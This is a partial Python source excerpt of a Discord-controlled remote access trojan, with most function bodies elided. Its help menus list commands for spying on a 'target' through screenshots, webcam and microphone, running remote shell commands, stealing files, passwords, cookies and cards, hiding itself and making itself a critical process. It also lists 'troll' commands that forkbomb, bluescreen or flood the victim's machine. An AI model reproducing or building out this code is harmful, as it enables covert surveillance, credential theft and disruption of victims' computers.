...
async def on_ready():
    ...
    if guild:
        ...
        embed = discord.Embed(
            title="[+] Rat Connected Successfully " if session else "[!] Rat Reconnected",
            description=f"[+] Your Session Key is {channel_name} :white_check_mark:\n**Use !helpme for Commands**",
...
async def music(ctx):
    # Embed message to notify the command has been executed
    embed = discord.Embed(
        title='[!] Command !music executed successfully',
        description='[!!] Warning: This cannot be stopped until the PC is restarted or force-stopped.',
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    # Limit the number of times to open the YouTube video (e.g., 5 times)
    try:
        for _ in range(5):  # Play the video 5 times
...
async def shutdown(ctx):
    if control_channel(ctx) == True:
        try:
            await ctx.channel.send("```[+] Shutdowning PC....```")
...
async def restart(ctx):
    if control_channel(ctx) == True:
        try:
            await ctx.channel.send("```[+] Restarting PC....```")
...
async def critproc(ctx):
 if control_channel(ctx) == True:
    try:
        ...
        await ctx.channel.send("```[+] Command Exucuted Successfuly !```")
    except Exception as e:
...
async def helpmsg(ctx):
    embed = discord.Embed(title="Remote Desktop", color=discord.Color.blue())
    embed.add_field(name="!recordvoice (second)", value="Record a Voice File.    ", inline=False)
    embed.add_field(name="!ss (number)", value="Take Screenshot & also add number of ss ", inline=False)
    embed.add_field(name="!getinfo", value="Get the informantion                 ", inline=False)
    embed.add_field(name="!ws (number)", value="Webcamshot                       ", inline=False)
    embed.add_field(name="!wstream", value="Real Time Photos From webcam         ", inline=False)
    embed.add_field(name="!stopstream", value="Stop Real Time Photos From webcam ", inline=False)
    embed.add_field(name="!video (second)", value="Video Recording               ", inline=False)
    embed.add_field(name="!amiadmin", value="Checks If You Are Admin or Not      ", inline=False)
    embed.add_field(name="!cmd", value="List All Command Prompt Commands         ", inline=False)
    embed.set_footer(text="Your super RAT bot is active!")

    embed2 = discord.Embed(title="Malware Commands", color=discord.Color.red())
    embed2.add_field(name="!ps (command)", value="Sends Commands to Target ", inline=False)
    embed2.add_field(name="!cd (folder name)", value="Change Directory With That ", inline=False)
    embed2.add_field(name="!kill (procces)", value=" Kill a Task", inline=False)
    embed2.add_field(name="!hide", value="Hide Rat", inline=False)
    embed2.add_field(name="!setlang (lang code)", value="Set Language Before Using !say", inline=False)
    embed2.add_field(name="!say (custom input)", value="Say Something Nice to Target", inline=False)
    embed2.add_field(name="!get (file or file path)", value="Get the File In the Target", inline=False)
    embed2.add_field(name="!voice (file)", value="Upload a Voice File Into Target and Run It", inline=False)
    embed2.add_field(name="!shutdown", value="Shutdown The PC", inline=False)
    embed2.add_field(name="!restart", value="Restart The PC", inline=False)
    embed2.add_field(name="!msg (custom input)", value="Send a MessageBox", inline=False)
    embed2.add_field(name="!wallpaper (picture)", value="Change the Wallpaper (only .png)", inline=False)
    embed2.add_field(name="!critproc", value="It Make The File has a Critical Process", inline=False)
    embed2.add_field(name="!upload (file)", value="Upload a File", inline=False)
    embed2.add_field(name="!website (website url)", value="Open the Website", inline=False)
    embed2.add_field(name="!session (session name)", value="Create a Session (Need a restart to use.)", inline=False)
    embed2.add_field(name="!clipboard", value="Copy the Clip Board", inline=False)
    embed2.add_field(name="!passwrd", value="Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info", inline=False)
    embed2.set_footer(text="Your super RAT bot is active!")

    embed3 = discord.Embed(title="Troll Commands", color=discord.Color.green())
    embed3.add_field(name=".fp", value="this spams furry stuff browsers on victims browser to flood their history", inline=False)
    embed3.add_field(name=".fork", value="forkbombs their computer using simple batch script", inline=False)
    embed3.add_field(name=".rickroll", value="rickrolls their computer for 30 seconds and they cannot escape", inline=False)
    embed3.add_field(name="!music", value="plays music on their computer", inline=False)
    embed3.add_field(name="!bluescreen", value="Blue Screen Error ", inline=False)
    embed3.add_field(name=".winspam", value="Spams A Browser Windows [warning cant stop it]", inline=False)
    embed3.set_footer(text="Your super RAT bot is active!")
